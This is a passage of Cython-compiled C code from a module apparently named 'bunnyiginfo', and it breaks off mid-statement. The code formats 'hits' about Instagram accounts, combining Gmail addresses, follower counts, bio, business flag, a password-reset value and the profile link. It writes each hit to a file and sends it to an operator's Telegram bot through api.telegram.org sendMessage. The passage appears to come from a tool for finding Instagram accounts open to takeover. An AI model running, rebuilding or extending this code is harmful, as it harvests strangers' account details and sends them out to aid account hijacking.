      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 5, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_gmail_com_FOLLOWERS);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 30;
      __Pyx_GIVEREF(__pyx_kp_u_gmail_com_FOLLOWERS);
      PyTuple_SET_ITEM(__pyx_t_6, 6, __pyx_kp_u_gmail_com_FOLLOWERS);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_v_followers, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 7, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_FOLLOWING);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_FOLLOWING);
      PyTuple_SET_ITEM(__pyx_t_6, 8, __pyx_kp_u_FOLLOWING);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 9, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_YEAR);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_YEAR);
      PyTuple_SET_ITEM(__pyx_t_6, 10, __pyx_kp_u_YEAR);
      __Pyx_INCREF(__pyx_v_account_year);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_account_year) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_account_year) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_account_year);
      __Pyx_GIVEREF(__pyx_v_account_year);
      PyTuple_SET_ITEM(__pyx_t_6, 11, __pyx_v_account_year);
      __Pyx_INCREF(__pyx_kp_u_ID_2);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_ID_2);
      PyTuple_SET_ITEM(__pyx_t_6, 12, __pyx_kp_u_ID_2);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__29, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 13, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_POSTS);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_POSTS);
      PyTuple_SET_ITEM(__pyx_t_6, 14, __pyx_kp_u_POSTS);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 15, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_BIO);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_BIO);
      PyTuple_SET_ITEM(__pyx_t_6, 16, __pyx_kp_u_BIO);
      __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_15, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 17, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_META);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 20;
      __Pyx_GIVEREF(__pyx_kp_u_META);
      PyTuple_SET_ITEM(__pyx_t_6, 18, __pyx_kp_u_META);
      __Pyx_INCREF(__pyx_v_header);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_header) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_header) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_header);
      __Pyx_GIVEREF(__pyx_v_header);
      PyTuple_SET_ITEM(__pyx_t_6, 19, __pyx_v_header);
      __Pyx_INCREF(__pyx_kp_u_BUSINESS_None_RESET);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 45;
      __Pyx_GIVEREF(__pyx_kp_u_BUSINESS_None_RESET);
      PyTuple_SET_ITEM(__pyx_t_6, 20, __pyx_kp_u_BUSINESS_None_RESET);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_v_reset_value, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 21, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_IG_LINK_https_www_instagram_com);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 46;
      __Pyx_GIVEREF(__pyx_kp_u_IG_LINK_https_www_instagram_com);
      PyTuple_SET_ITEM(__pyx_t_6, 22, __pyx_kp_u_IG_LINK_https_www_instagram_com);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 23, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_DEV_iownpy);
      __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;
      __pyx_t_9 += 59;
      __Pyx_GIVEREF(__pyx_kp_u_DEV_iownpy);
      PyTuple_SET_ITEM(__pyx_t_6, 24, __pyx_kp_u_DEV_iownpy);
      __pyx_t_15 = __Pyx_PyUnicode_Join(__pyx_t_6, 25, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 300, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_hit_data = ((PyObject*)__pyx_t_15);
      __pyx_t_15 = 0;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_13);
        /*try:*/ {

          
          /*with:*/ {
            __pyx_t_15 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_15);
            if (PyDict_SetItem(__pyx_t_15, __pyx_n_s_encoding, __pyx_kp_u_utf_8) < 0) __PYX_ERR(0, 319, __pyx_L30_error)
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__32, __pyx_t_15); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
            __pyx_t_16 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_exit); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_5 = __Pyx_PyObject_LookupSpecial(__pyx_t_6, __pyx_n_s_enter); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 319, __pyx_L36_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
              }
            }
            __pyx_t_15 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 319, __pyx_L36_error)
            __Pyx_GOTREF(__pyx_t_15);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = __pyx_t_15;
            __pyx_t_15 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
                __Pyx_XGOTREF(__pyx_t_17);
                __Pyx_XGOTREF(__pyx_t_18);
                __Pyx_XGOTREF(__pyx_t_19);
                /*try:*/ {
                  __pyx_v_file = __pyx_t_5;
                  __pyx_t_5 = 0;

                  
                  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 320, __pyx_L40_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  __pyx_t_15 = __Pyx_PyUnicode_Concat(__pyx_v_hit_data, __pyx_kp_u__33); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 320, __pyx_L40_error)
                  __Pyx_GOTREF(__pyx_t_15);
                  __pyx_t_4 = NULL;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
                    if (likely(__pyx_t_4)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                      __Pyx_INCREF(__pyx_t_4);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_6, function);
                    }
                  }
                  __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_4, __pyx_t_15) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_15);
                  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                  __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 320, __pyx_L40_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                goto __pyx_L45_try_end;
                __pyx_L40_error:;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("source.bunnyiginfo", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_15) < 0) __PYX_ERR(0, 319, __pyx_L42_except_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __Pyx_GOTREF(__pyx_t_6);
                  __Pyx_GOTREF(__pyx_t_15);
                  __pyx_t_4 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_15); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 319, __pyx_L42_except_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_t_4, NULL);
                  __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                  if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 319, __pyx_L42_except_error)
                  __Pyx_GOTREF(__pyx_t_20);
                  __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_20);
                  __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
                  if (__pyx_t_8 < 0) __PYX_ERR(0, 319, __pyx_L42_except_error)
                  __pyx_t_7 = ((!(__pyx_t_8 != 0)) != 0);
                  if (__pyx_t_7) {
                    __Pyx_GIVEREF(__pyx_t_5);
                    __Pyx_GIVEREF(__pyx_t_6);
                    __Pyx_XGIVEREF(__pyx_t_15);
                    __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_15);
                    __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_15 = 0; 
                    __PYX_ERR(0, 319, __pyx_L42_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                  goto __pyx_L41_exception_handled;
                }
                __pyx_L42_except_error:;
                __Pyx_XGIVEREF(__pyx_t_17);
                __Pyx_XGIVEREF(__pyx_t_18);
                __Pyx_XGIVEREF(__pyx_t_19);
                __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                goto __pyx_L30_error;
                __pyx_L41_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_17);
                __Pyx_XGIVEREF(__pyx_t_18);
                __Pyx_XGIVEREF(__pyx_t_19);
                __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                __pyx_L45_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_16) {
                  __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_tuple__15, NULL);
                  __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                  if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 319, __pyx_L30_error)
                  __Pyx_GOTREF(__pyx_t_19);
                  __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                }
                goto __pyx_L39;
              }
              __pyx_L39:;
            }
            goto __pyx_L49;
            __pyx_L36_error:;
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L30_error;
            __pyx_L49:;
          }

          
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L35_try_end;
        __pyx_L30_error:;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
        __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_14) {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L31_exception_handled;
        }
        goto __pyx_L32_except_error;
        __pyx_L32_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        goto __pyx_L3_error;
        __pyx_L31_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
        __pyx_L35_try_end:;
      }

      
      __pyx_t_15 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 323, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      if (PyDict_SetItem(__pyx_t_15, __pyx_n_u_text, __pyx_n_u__34) < 0) __PYX_ERR(0, 323, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_15, __pyx_n_u_url, __pyx_kp_u_https_t_me_iownpy) < 0) __PYX_ERR(0, 323, __pyx_L3_error)

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 325, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_text, __pyx_n_u__35) < 0) __PYX_ERR(0, 325, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_url, __pyx_kp_u_https_t_me_pytoonzl) < 0) __PYX_ERR(0, 325, __pyx_L3_error)

      
      __pyx_t_5 = PyList_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 323, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_15);
      PyList_SET_ITEM(__pyx_t_5, 0, __pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_6);
      PyList_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
      __pyx_t_15 = 0;
      __pyx_t_6 = 0;
      __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 323, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_5);
      PyList_SET_ITEM(__pyx_t_6, 0, __pyx_t_5);
      __pyx_t_5 = 0;
      __pyx_v_inline_keyboard = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_text, __pyx_v_hit_data) < 0) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_json); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_dumps); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;

      
      __pyx_t_15 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 328, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      if (PyDict_SetItem(__pyx_t_15, __pyx_n_u_inline_keyboard, __pyx_v_inline_keyboard) < 0) __PYX_ERR(0, 328, __pyx_L3_error)
      __pyx_t_21 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_21)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_21);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_5 = (__pyx_t_21) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_21, __pyx_t_15) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_15);
      __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_reply_markup, __pyx_t_5) < 0) __PYX_ERR(0, 327, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_data = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ID); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 329, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (unlikely(PyDict_SetItem(__pyx_v_data, __pyx_n_u_chat_id, __pyx_t_6) < 0)) __PYX_ERR(0, 329, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_requests); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 330, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 330, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 331, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_9 = 0;
      __pyx_t_10 = 127;
      __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
      __pyx_t_9 += 28;
      __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_https_api_telegram_org_bot);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_token); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 331, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 331, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_10;
      __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
      __Pyx_GIVEREF(__pyx_t_15);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_15);
      __pyx_t_15 = 0;
      __Pyx_INCREF(__pyx_kp_u_sendMessage);
      __pyx_t_9 += 12;
      __Pyx_GIVEREF(__pyx_kp_u_sendMessage);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_sendMessage);
      __pyx_t_15 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 331, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 330, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_15);
